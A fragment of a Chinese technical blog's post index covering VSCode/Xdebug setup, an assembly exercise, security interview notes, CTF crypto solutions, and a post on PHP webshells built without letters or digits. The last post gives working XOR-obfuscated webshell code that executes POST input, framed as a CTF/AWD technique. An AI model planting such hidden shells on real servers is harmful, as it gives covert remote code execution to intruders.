class="line">1|pxy|123456</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlit </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu配置vscode+xdebug</title>
      <link href="/posts/38fc34e6/"/>
      <url>/posts/38fc34e6/</url>
      
        <content type="html"><![CDATA[<h2 id="vscode安装"><a href="#vscode安装" class="headerlink" title="vscode安装"></a>vscode安装</h2><p>直接去官网下载deb包，然后双击即可完成安装</p><p>加两个配置选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;editor.mouseWheelZoom&quot;: true,</span><br><span class="line">&quot;php.validate.executablePath&quot;: &quot;&#x2F;usr&#x2F;bin&#x2F;php&quot;</span><br></pre></td></tr></table></figure><p>第一个是直接用滚轮缩放大小，并且图标的大小不变，第二个是配置php的路径</p><p>之后安装一些插件就不说了</p><h2 id="apache环境"><a href="#apache环境" class="headerlink" title="apache环境"></a>apache环境</h2><p>直接安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install apache2</span><br></pre></td></tr></table></figure><p>然后安装php模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libapache2-mod-php</span><br></pre></td></tr></table></figure><p>之后，修改一下html目录的用户和组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chown pxy html&#x2F; -R</span><br><span class="line">chgrp pxy html&#x2F; -R</span><br></pre></td></tr></table></figure><h2 id="xdebug"><a href="#xdebug" class="headerlink" title="xdebug"></a>xdebug</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -i &gt; a.txt</span><br></pre></td></tr></table></figure><p>然后将 a.txt 的内容拷贝到</p><p><a href="https://xdebug.org/wizard" target="_blank" rel="noopener">https://xdebug.org/wizard</a></p><p>自动帮你分析phpinfo的内容(不过现在只支持php7了)</p><ol><li><p>Download <a href="http://xdebug.org/files/xdebug-2.9.4.tgz" target="_blank" rel="noopener">xdebug-2.9.4.tgz</a></p></li><li><p>Install the pre-requisites for compiling PHP extensions.<br>On your Ubuntu system, install them with: <code>apt-get install php-dev autoconf automake</code></p></li><li><p>Unpack the downloaded file with <code>tar -xvzf xdebug-2.9.4.tgz</code></p></li><li><p>Run: <code>cd xdebug-2.9.4</code></p></li><li><p>Run: <code>phpize</code> (See the <a href="https://xdebug.org/docs/faq#phpize" target="_blank" rel="noopener">FAQ</a> if you don’t have <code>phpize</code>).</p><p>As part of its output it should show:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Configuring for:</span><br><span class="line">...</span><br><span class="line">Zend Module Api No:      20170718</span><br><span class="line">Zend Extension Api No:   320170718</span><br></pre></td></tr></table></figure></li></ol><p>   If it does not, you are using the wrong <code>phpize</code>. Please follow <a href="https://xdebug.org/docs/faq#custom-phpize" target="_blank" rel="noopener">this FAQ entry</a> and skip the next step.</p><ol start="6"><li><p>Run: <code>./configure</code></p></li><li><p>Run: <code>make</code></p></li><li><p>Run: <code>cp modules/xdebug.so /usr/lib/php/20170718</code></p></li><li><p>Update <code>/etc/php/7.2/cli/php.ini</code> and change the line<br><code>zend_extension = /usr/lib/php/20170718/xdebug.so</code></p></li><li><p>Please also update <code>php.ini</code> files in adjacent directories, as your system seems to be configured with a separate <code>php.ini</code> file for the web server and command line.</p></li></ol><p>重点是后面几个步骤：</p><ol><li><p><code>cp modules/xdebug.so /usr/lib/php/20170718</code></p></li><li><p>修改 <code>/etc/php/7.2/cli/php.ini</code> 文件内容，加上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zend_extension &#x3D; &#x2F;usr&#x2F;lib&#x2F;php&#x2F;20170718&#x2F;xdebug.so</span><br></pre></td></tr></table></figure></li><li><p>然后还需要修改  <code>/etc/php/7.2/apache2</code> 目录下的 php.ini 这个才是web的</p></li></ol><p>如图， <code>cli</code> 目录是命令行， <code>apache2</code> 才是web的</p><p><img src= "/img/loading.gif" data-src="/posts/38fc34e6/1587378336782.png" alt></p><ol start="4"><li>之后还需要修改 <code>mods-available</code> 目录下的文件</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pxy@pxy-VirtualBox:&#x2F;etc&#x2F;php&#x2F;7.2&#x2F;mods-available$ cat xdebug.ini </span><br><span class="line">;zend_extension&#x3D;xdebug.so</span><br><span class="line">xdebug.remote_enable &#x3D; 1</span><br><span class="line">xdebug.remote_port &#x3D; 9000</span><br><span class="line">;xdebug.idekey &#x3D; PHPSTORM</span><br><span class="line">xdebug.remote_host&#x3D;localhost</span><br><span class="line">xdebug.remote_autostart &#x3D; 1</span><br><span class="line">xdebug.show_error_trace &#x3D; 1</span><br></pre></td></tr></table></figure><ol start="5"><li>最后需要在web和cli下的 <code>conf.d</code> 中做一次软链接</li></ol><p><img src= "/img/loading.gif" data-src="/posts/38fc34e6/1587378447111.png" alt></p><p>至此xdebug+vscode就配置好了</p><p><img src= "/img/loading.gif" data-src="/posts/38fc34e6/1587378474835.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> vscode </tag>
            
            <tag> xdebug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编从入门到入土六</title>
      <link href="/posts/79b4f583/"/>
      <url>/posts/79b4f583/</url>
      
        <content type="html"><![CDATA[<h2 id="mul和div"><a href="#mul和div" class="headerlink" title="mul和div"></a>mul和div</h2><p><strong>mul指令</strong></p><ol><li>两个相乘的数，如果都为8位，其中一个默认存放在AL，另一个放在8位寄存器或者内存字节单元中，结果是16位的，默认存放在AX中</li><li>两个相乘的数，如果都为16位，其中一个默认存放在AX，另一个放在16位寄存器或者内存字单元中，结果是32位的，高位默认存放在DX中，低位存放在AX中</li></ol><p><strong>div指令</strong></p><ol><li>除数有8位和16位，存放在reg或者内存单元</li><li>除数为8位，被除数为16位，被除数默认存放在AX中。除数为16位，被除数为32位，被除数高位存放在DX中，低位存放在AX中</li><li>结果，除数为8位，商存储在AL，余数存储在AH。除数为16位，商存储在AX，余数存储在DX</li></ol><h2 id="实验九-打印"><a href="#实验九-打印" class="headerlink" title="实验九 打印"></a>实验九 打印</h2><p>打印helloworld</p><p>尤其要注意 <code>mov al, [bp]</code>，这里是取出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line">    db &#39;Hello World&#39;</span><br><span class="line">    db 24h</span><br><span class="line">    dw 1824 </span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">    mov ax,data</span><br><span class="line">    mov ds,ax</span><br><span class="line"></span><br><span class="line">    mov ax, 0b800h</span><br><span class="line">    mov es, ax</span><br><span class="line"></span><br><span class="line">    mov si,0</span><br><span class="line">    mov di,0</span><br><span class="line"></span><br><span class="line">    mov bx, ds:[12]</span><br><span class="line">    mov bp, ds:[11]</span><br><span class="line"></span><br><span class="line">    mov cx, 11</span><br><span class="line">s:</span><br><span class="line">    mov al, ds:[si]</span><br><span class="line">    mov es:[bx+di], al</span><br><span class="line">    mov al, [bp]</span><br><span class="line">    mov es:[bx+di+1], al</span><br><span class="line"></span><br><span class="line">    inc si</span><br><span class="line">    add di,2</span><br><span class="line">    loop s</span><br><span class="line"></span><br><span class="line">    mov ax,4c00h</span><br><span class="line">    int 21h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春招面经汇总</title>
      <link href="/posts/ddd168ac/"/>
      <url>/posts/ddd168ac/</url>
      
        <content type="html"><![CDATA[<p>从2月到4月，中间大大小小经历了20次左右的面试，最后选择去腾讯WXG的后台策略安全岗</p><h2 id="长亭"><a href="#长亭" class="headerlink" title="长亭"></a>长亭</h2><ol><li>自我介绍</li><li>tomcat AJP漏洞了解过吗</li><li>Java反序列化漏洞</li><li>JNDI注入，Java7和Java8的区别(这里确实是自己挖坑了，简历上写了自己会Java审计，JNDI注入等，但是并没有仔细准备，结果面试官抓着Java不放)</li><li>XXE如果无法联网怎么利用(三层嵌套报错XXE或者利用系统自带的DTD文件)</li><li>你比较擅长的方面</li></ol><p>不知道为啥和长亭面试官聊起来挺尬的。最后也只面试了20分钟就结束了，当然结果是凉凉了</p><h2 id="字节跳动-企业应用安全"><a href="#字节跳动-企业应用安全" class="headerlink" title="字节跳动-企业应用安全"></a>字节跳动-企业应用安全</h2><h3 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h3><ol><li>具体的一个代码审计案例</li><li>说一下你知道的四种漏洞的原理，利用，危害和防御</li><li>XSS知道吗</li><li>说一下前端漏洞中你比较熟悉的</li><li>python沙盒逃逸</li><li>你觉得自己的优势是什么</li><li>对未来的规划</li></ol><p>字节跳动一面官感觉挺棒的，全程在引导你，而且特别尊重你说出自己的看法</p><h3 id="二面"><a href="#二面" class="headerlink" title="二面"></a>二面</h3><ol><li>简单问了几个小问题，python沙盒逃逸，JavaScript原型链污染</li><li>有没有了解过electron框架（就是开发vscode的，我说没有，但是我知道vue</li><li>vue怎么防御csrf(我不太了解vue怎么防范，先说一些怎么防CSRF balabal)</li><li>提示vue是通过ajax和后端连接，我：哦想起来了，那就用CORS来防御，然后说了CORS的防御</li><li>继续问。CORS分为简单请求和非简单请求，一个POST请求怎么区分</li><li>java做过哪些</li><li>mXSS了解吗</li><li>参数压栈入栈简单说下</li><li>你怎么将CTF学到的用到实战</li><li>go有没有了解</li></ol><p>二面面试官也挺棒的，唯一的问题就是。。。他家的小孩子太吵了。。几次打断我的思路</p><h3 id="三面"><a href="#三面" class="headerlink" title="三面"></a>三面</h3><p>三面是部门leader面，本来以为会继续问技术的，结果。。问了一堆人生相关的问题，而且回答的不好，没有完全表现出自己的水平。。</p><ol><li>第一次打CTF的经历(就是由于一开始的这个问题导致我后面都在说CTF，可能leader觉得我的眼界太小了吧)</li><li>你对未来的规划(这种问题真心不好回答)</li><li>你是怎么选择上这个专业的</li><li>你认为你还有哪些技能需要完善</li><li>你觉得学习编程语言需要注意哪些</li><li>go的垃圾回收机制(这个真是自己多嘴了，不该说自己学了点go的，这个问题没答上来)</li><li>go的并发机制有哪些(我就知道channel。。)</li></ol><p>周五面试完，下周一结果出来后就凉凉了，之后转岗到安全与风控部门，结果这是个开发岗，问的问题都是和编程有关的</p><p>只记录了几个问题：</p><ol><li>http1.0和1.1的区别</li><li>hashtable的原理</li><li>进程和线程的区别</li><li>进程间通信的方式</li><li>hash冲突解决</li><li>tcp和udp协议</li><li>用c语言实现双链表的插入和删除</li></ol><p>面试了一个多小时。。最后面试官说看了我的博客觉得我在漏洞挖掘，渗透这块还行，建议我投其他的部门，我说我就是转岗过来的。。。</p><h2 id="知道创宇-404实验室"><a href="#知道创宇-404实验室" class="headerlink" title="知道创宇 - 404实验室"></a>知道创宇 - 404实验室</h2><p>知道创宇是3月5号投递的，结果3月底才安排面试，以至于我都忘记投递了。</p><ol><li>分享几个cms漏洞挖掘的案例</li><li>代码审计的思路</li><li>假设一个cms你找到了一个反序列化的入口，如何挖掘POP链</li><li>如果cms中找不到POP链怎么利用(不知道，面试官告诉我可以用内置的类进行反序列化)</li><li>印象最深的一道CTF题</li><li>解释一下js的原型链污染</li><li>说一下你对tomcat AJP漏洞的分析</li><li>除了CTF，代码审计你还从哪里学安全知识</li><li>储存型XSS但是httponly了怎么利用</li><li>说一下redis主从复制漏洞</li><li>解释一下python的全局变量锁</li><li>python什么时候会用到多线程，什么时候用到多进程</li><li>为什么python的多线程是伪多线程</li><li>开发一个cms自动化代码审计的工具你有哪些思路</li></ol><h2 id="腾讯-应用运维安全"><a href="#腾讯-应用运维安全" class="headerlink" title="腾讯-应用运维安全"></a>腾讯-应用运维安全</h2><p>我后来才知道腾讯面试的流程，首先有一个公共的简历池，之后每个部门在里面捞简历，一般看到一份还行的简历会打电环了解一下情况(所以我接了好几个了解情况的电话)，之后如果要面试的话需要锁定这一份简历，这样的话其他部门就无法面试你，只有锁定简历的部门才行。</p><p>两轮电话了解情况之后，我的简历投到了应用运维安全，具体哪个事业群不知道</p><h3 id="一面-1"><a href="#一面-1" class="headerlink" title="一面"></a>一面</h3><ol><li>入侵响应</li><li>重置密码逻辑漏洞</li><li>RMI 利用的一个流程</li><li>flask SSTI 漏洞</li><li>XSS怎么防护</li><li>CSP如何绕</li><li>安全开发流程</li><li>JavaScript 闭包</li><li>常用远程控制软件</li><li>SQL过滤了单引号怎么绕过</li><li>SQL注入如何防护</li><li>Linux查看进程和查看端口的命令</li></ol><p>之后网申的页面提示进入了复试阶段，但是一直没更新。直到变灰。</p><h2 id="腾讯-后台策略安全"><a href="#腾讯-后台策略安全" class="headerlink" title="腾讯-后台策略安全"></a>腾讯-后台策略安全</h2><p>本来以为腾讯没希望了，人都去新疆给做培训了，结果腾讯微信事业群联系我问有没有意向</p><h3 id="4-9-0面"><a href="#4-9-0面" class="headerlink" title="4.9 0面"></a>4.9 0面</h3><p>问了大概一个多小时，感觉就是提前了解情况，后来才知道也不是一面。姑且叫做0面好了，面完之后也没有做记录，只有靠回忆了</p><ol><li>说一下python沙盒逃逸</li><li>了解过nodejs的沙盒逃逸吗</li><li>说一下JavaScript原型链污染</li><li>dll注入了解过吗</li><li>二进制程序常见的壳，脱壳的方法</li><li>了解过大数据吗</li><li>编程题: 将一个数组的奇数移到前面，偶数移到后面</li></ol><h3 id="4-11-一面"><a href="#4-11-一面" class="headerlink" title="4.11 一面"></a>4.11 一面</h3><ol><li>https和http的区别</li><li>http怎么防止运营商篡改你的流量</li><li>操作系统进程通信方式</li><li>XSS和CSRF</li><li>二次注入</li><li>web安全有没有总结一些方法论什么的</li><li>操作系统的最小调度单位是什么，操作系统资源分配的最小单位是什么，如果一个进程crash了，它的线程会发生什么</li><li>tcp为啥要三次握手，两次和四次不行吗</li><li>脱壳的方式</li><li>编程题：二分查找</li></ol><h3 id="4-13-二面"><a href="#4-13-二面" class="headerlink" title="4.13 二面"></a>4.13 二面</h3><p>这一面感觉面的挺尬的，面完后还觉得自己凉了，面完之后每天都忍不住去看官网的状态</p><ol><li>有没有渗透攻防经历</li><li>逆向了解过哪些</li><li>小程序游戏，比如跳一跳，怎么防止查重</li><li>二进制安全学习过哪些.</li><li>java安全学习过哪些</li><li>apk逆向了解不</li><li>java的hashtable实现原理</li><li>hash泛洪攻击了解吗</li><li>tcp泛洪攻击</li><li>你认为你相比其他人的优势</li><li>你玩过哪些微信游戏</li><li>内容安全了解吗</li><li>编程题：数组去重</li></ol><h3 id="4-17-三面"><a href="#4-17-三面" class="headerlink" title="4.17 三面"></a>4.17 三面</h3><p>第一次在机场面试。。实在是没办法，这是腾讯校招的最后一天必须得面完</p><p>然而面试官问我的问题我都没听明白</p><ol><li>怎么检测开发者绕过我们设定的策略</li><li>如何检测内容安全</li><li>如何防止外挂</li><li>你还有什么补充的(然后我就开始跑火车了)</li></ol><p>由于在机场，面试也只持续了半个小时左右</p><h3 id="4-18-hr面"><a href="#4-18-hr面" class="headerlink" title="4.18 hr面"></a>4.18 hr面</h3><ol><li>你认为你相对别人的优势</li><li>之前没有实习经历</li><li>之前有投递过其他的安全公司吗</li><li>你觉得这个岗位和你相契合吗</li><li>你父母的工作，你父母对你的影响</li></ol><p>聊了大概大概十分钟，面试官声音很有特点。面试的邀请函都是4.18号凌晨发过来的，估计在加班hhhh</p><h2 id="阿里"><a href="#阿里" class="headerlink" title="阿里"></a>阿里</h2><p>2月底的时候看到博客园的一个师傅，首页上写着阿里云云安全团队长期招收实习生，于是联系了他，做了一次简单的非正式面试，校招开始的时候也是他帮我内推的</p><h3 id="一面-2"><a href="#一面-2" class="headerlink" title="一面"></a>一面</h3><p>一面很水，不到二十分钟，感觉就是简单了解了情况</p><h3 id="二面-1"><a href="#二面-1" class="headerlink" title="二面"></a>二面</h3><ol><li>渗透测试有没有做过</li><li>怎么检测反弹shell</li><li>怎么检测黑客入侵Linux服务器</li><li>structs2漏洞说一下 </li><li>cms审计说一说</li><li>系统提权说一说</li><li>有没有做过演讲</li><li>安全方面有哪些成就</li><li>IOT哪些产出</li></ol><p>答得不是很好，结果凉凉</p><h2 id="华为"><a href="#华为" class="headerlink" title="华为"></a>华为</h2><h3 id="笔试"><a href="#笔试" class="headerlink" title="笔试"></a>笔试</h3><p>华为这次笔试感觉真的难，只有单选，不定项选(少选不给分)，和一道编程题</p><ol><li>fuzz框架考了很多，而且都是问用处，但是我都不知道</li><li>Linux的操作也考了一些，比如 <code>/etc/profile</code> 文件中设置的环境变量对所有用户都生效</li><li>web安全，有直接给源码问你漏洞点的，还有一些基本概念，这个反倒是不难</li><li>二进制安全，有一道直接考ROP链的，让你选择栈布局</li></ol><p>不知道还有没有后续的面试</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>校招还是比较看重基础，但是对于偏乙方的比如长亭和知道创宇可能要求你有一些比较擅长的点，而且会问的比较细。大厂主要是看你的基础知识是不是很扎实。感觉面试的很多问题都是可以直接从网上找到答案的，但是还是要拿来问emmm。最后，感觉面试真是3分运气，7分实力，不过不到最后也不要轻言放弃，万一呢，万一呢。</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面经 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学题目</title>
      <link href="/posts/1dea6763/"/>
      <url>/posts/1dea6763/</url>
      
        <content type="html"><![CDATA[<p>记录一下ctf.show平台</p><p><a href="https://ctf.show/challenges" target="_blank" rel="noopener">https://ctf.show/challenges</a></p><h2 id="crypto0"><a href="#crypto0" class="headerlink" title="crypto0"></a>crypto0</h2><p>凯撒密码</p><p><img src= "/img/loading.gif" data-src="/posts/1dea6763/1586531882516-1587195417553.png" alt></p><h2 id="crypto2"><a href="#crypto2" class="headerlink" title="crypto2"></a>crypto2</h2><p>jsfuck</p><p><img src= "/img/loading.gif" data-src="/posts/1dea6763/1587194700279.png" alt></p><h2 id="crypto3"><a href="#crypto3" class="headerlink" title="crypto3"></a>crypto3</h2><p>还是jsfuck编码</p><p><img src= "/img/loading.gif" data-src="/posts/1dea6763/1587194728413.png" alt></p><h2 id="crypto4"><a href="#crypto4" class="headerlink" title="crypto4"></a>crypto4</h2><p>p=447685307 q=2037 e=17</p><p>提交flag{d}即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">给出p,q,e 求d</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># p = 3487583947589437589237958723892346254777</span></span><br><span class="line"><span class="comment"># q = 8767867843568934765983476584376578389</span></span><br><span class="line"><span class="comment"># e = 65537</span></span><br><span class="line">p=<span class="number">18443</span></span><br><span class="line">q=<span class="number">49891</span></span><br><span class="line">e=<span class="number">19</span></span><br><span class="line">phin = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> gmpy2.invert(e, phin)</span><br></pre></td></tr></table></figure><h2 id="crypto5"><a href="#crypto5" class="headerlink" title="crypto5"></a>crypto5</h2><p>p=447685307 q=2037 e=17 c=704796792</p><p>提交flag{m}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">给出p,q,e,c 求d和m</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">p=<span class="number">447685307</span></span><br><span class="line">q=<span class="number">2037</span></span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">c=<span class="number">704796792</span></span><br><span class="line">phin = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phin)</span><br><span class="line"><span class="keyword">print</span> pow(c,d,p*q)</span><br></pre></td></tr></table></figure><h2 id="crypto7"><a href="#crypto7" class="headerlink" title="crypto7"></a>crypto7</h2><p>ook解密</p><p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b615c4b79a1aede83b9ae67104ff4eb5&#125;</span><br></pre></td></tr></table></figure><h2 id="crypto8"><a href="#crypto8" class="headerlink" title="crypto8"></a>crypto8</h2><p>brainfuck解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;99754106633f94d350db34d548d6091a&#125;</span><br></pre></td></tr></table></figure><h2 id="crypto9"><a href="#crypto9" class="headerlink" title="crypto9"></a>crypto9</h2><p>密码是4132</p><p><a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">http://serpent.online-domain-tools.com/</a></p><p><img src= "/img/loading.gif" data-src="/posts/1dea6763/1586560529022.png" alt></p><h2 id="crypto10"><a href="#crypto10" class="headerlink" title="crypto10"></a>crypto10</h2><p>邮件编码</p><h2 id="crypto11"><a href="#crypto11" class="headerlink" title="crypto11"></a>crypto11</h2><p>解密后就是ctf</p><h2 id="crypto13"><a href="#crypto13" class="headerlink" title="crypto13"></a>crypto13</h2><p>混合加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = base64.b32decode(s)</span><br><span class="line">        s = base(s)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s = base64.b64decode(s)</span><br><span class="line">            s = base(s)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line">f = open(<span class="string">'base.txt'</span>)</span><br><span class="line"></span><br><span class="line">text = f.read()</span><br><span class="line"></span><br><span class="line">print(base(text))</span><br></pre></td></tr></table></figure><p>flag{b4Se_Fami1y_Is_FUn}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无字母数字webshell</title>
      <link href="/posts/bed5b94f/"/>
      <url>/posts/bed5b94f/</url>
      
        <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/[a-z0-9]/is'</span>,$_GET[<span class="string">'shell'</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">'shell'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="通过异或"><a href="#通过异或" class="headerlink" title="通过异或"></a>通过异或</h2><p>原理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">echo</span> chr(<span class="number">0x01</span>)^<span class="string">'`'</span>;</span><br><span class="line">a</span><br><span class="line">php &gt; <span class="keyword">echo</span> chr(<span class="number">0x13</span>)^<span class="string">'`'</span>;</span><br><span class="line">s</span><br><span class="line">php &gt; <span class="keyword">echo</span> chr(<span class="number">0x05</span>)^<span class="string">'`'</span>;</span><br><span class="line">e</span><br></pre></td></tr></table></figure><p>所以即可构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_=(<span class="string">'%01'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%05'</span>^<span class="string">'`'</span>).(<span class="string">'%12'</span>^<span class="string">'`'</span>).(<span class="string">'%14'</span>^<span class="string">'`'</span>); <span class="comment">//$_=assert</span></span><br><span class="line">$__=<span class="string">'_'</span>.(<span class="string">'%0D'</span>^<span class="string">']'</span>).(<span class="string">'%2F'</span>^<span class="string">'`'</span>).(<span class="string">'%0E'</span>^<span class="string">']'</span>).(<span class="string">'%09'</span>^<span class="string">']'</span>); <span class="comment">// $__ = _POST</span></span><br><span class="line">$___=$$__; <span class="comment">//$___ = $_POST</span></span><br><span class="line">$_($___[_]);<span class="comment">// assert($_POST[_])</span></span><br></pre></td></tr></table></figure><p>在 <code>php5.5.38</code> 通过测试</p><p><img src= "/img/loading.gif" data-src="/posts/bed5b94f/1586074270072.png" alt></p><p>但是如果切换为 <code>php7.1.3</code> 执行失败</p><p><img src= "/img/loading.gif" data-src="/posts/bed5b94f/1586074316094.png" alt></p><h3 id="构造webshell"><a href="#构造webshell" class="headerlink" title="构造webshell"></a>构造webshell</h3><p>通过这种方式可以构造异或形式的webshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @$_++; <span class="comment">// $_ = 1</span></span><br><span class="line">    $__=(<span class="string">"#"</span>^<span class="string">"|"</span>); <span class="comment">// $__ = _</span></span><br><span class="line">    $__.=(<span class="string">"."</span>^<span class="string">"~"</span>); <span class="comment">// _P</span></span><br><span class="line">    $__.=(<span class="string">"/"</span>^<span class="string">"`"</span>); <span class="comment">// _PO</span></span><br><span class="line">    $__.=(<span class="string">"|"</span>^<span class="string">"/"</span>); <span class="comment">// _POS</span></span><br><span class="line">    $__.=(<span class="string">"&#123;"</span>^<span class="string">"/"</span>); <span class="comment">// _POST </span></span><br><span class="line">    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); <span class="comment">// $_POST[0]($_POST[1]);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x3D;assert&amp;1&#x3D;phpinfo()</span><br></pre></td></tr></table></figure><p>在 AWD 中常用来做隐藏的shell</p><p><img src= "/img/loading.gif" data-src="/posts/bed5b94f/1586074779485.png" alt></p><p>当然这种马是直接被杀的</p><p><img src= "/img/loading.gif" 